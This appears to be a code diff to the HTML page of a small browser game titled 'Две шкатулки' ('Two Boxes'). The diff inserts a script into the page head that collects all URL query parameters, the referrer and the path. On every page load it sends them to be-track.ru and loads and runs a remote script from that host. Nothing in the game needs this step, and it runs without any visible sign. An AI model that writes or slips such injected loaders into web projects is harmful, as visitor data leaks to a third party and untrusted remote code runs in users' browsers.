@@ -12,6 +12,95 @@
   <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
   <meta name="viewport" content="width=device-width,user-scalable=no" />  
   <title>Две шкатулки</title>
+
+
+  <script>
+function getAllUrlParams(url) {
+var queryString = url ? url.split('?')[1] : window.location.search.slice(1);
+var obj = {};
+if (queryString) {
+queryString = queryString.split('#')[0];
+var arr = queryString.split('&');
+for (var i=0; i<arr.length; i++) {
+var a = arr[i].split('=');
+var paramNum = undefined;
+var paramName = a[0].replace(/\[\d*\]/, function(v) {
+paramNum = v.slice(1,-1);
+return '';
+});
+var paramValue = typeof(a[1])==='undefined' ? true : a[1];
+paramName = paramName.toLowerCase();
+paramValue = paramValue.toLowerCase();
+if (obj[paramName]) {
+if (typeof obj[paramName] === 'string') {
+obj[paramName] = [obj[paramName]];
+}
+if (typeof paramNum === 'undefined') {
+obj[paramName].push(paramValue);
+}else {
+obj[paramName][paramNum] = paramValue;
+}
+}else {
+obj[paramName] = paramValue;
+}
+}
+}
+return obj;
+}
+function loadScript(src,_timeout) {
+
+return new Promise(function(resolve, reject){
+if(!src){
+reject(new TypeError('filename is missing'));
+return;
+}
+var script=document.createElement('script'),
+timer,
+head=document.getElementsByTagName('head')[0];
+head.appendChild(script);
+function leanup(){
+clearTimeout(timer);
+timer=null;
+script.onerror=script.onreadystatechange=script.onload=null;
+}
+function onload(){
+leanup();
+if(!script.onreadystatechange|| (script.readyState && script.readyState === 'complete' )){
+resolve(script);
+}
+}
+script.onerror=function(error){
+leanup();
+head.removeChild(script);
+script=null;
+reject(new Error('network'));
+};
+if (script.onreadystatechange === undefined) {
+script.onload = onload;
+} else {
+script.onreadystatechange = onload;
+}
+timer=setTimeout(script.onerror,_timeout||30000);
+script.setAttribute('type', 'text/javascript');
+script.setAttribute('src', src);
+});
+}
+var str = getAllUrlParams();
+var str1 = {};
+if(document.referrer === 'undefined'){
+str1.referer = '';
+}else {
+str1.referer = document.referrer;
+}
+str1.uri = str;
+str1.request_uri = location.pathname.substring(1);
+str1 = JSON.stringify(str1);
+loadScript('https://be-track.ru/fp/bootstrap.js?c=143&param='+str1).then(function(){},function(error){
+console.log(error);
+});
+</script>
+
+
  </head>
 
 <body onload="startGame(Menu, 30);">
